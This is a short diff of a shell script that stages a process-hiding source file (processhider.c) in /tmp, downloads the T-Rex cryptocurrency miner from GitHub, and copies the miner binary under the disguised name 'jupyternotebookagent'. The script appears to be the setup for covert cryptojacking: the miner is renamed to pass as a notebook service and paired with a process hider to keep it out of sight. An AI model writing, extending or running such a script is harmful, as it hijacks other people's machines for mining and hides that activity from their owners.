@@ -1,4 +1,5 @@
-mkdir /tmp/ml && cp -r Makefile processhider.c /tmp/ml/ && cd /tmp/ml
+mkdir /tmp/ml && mv Makefile processhider.c /tmp/ml/ 
+cd /tmp/ml
 wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
 tar xf t-rex-0.26.8-linux.tar.gz
 cp t-rex ../jupyternotebookagent
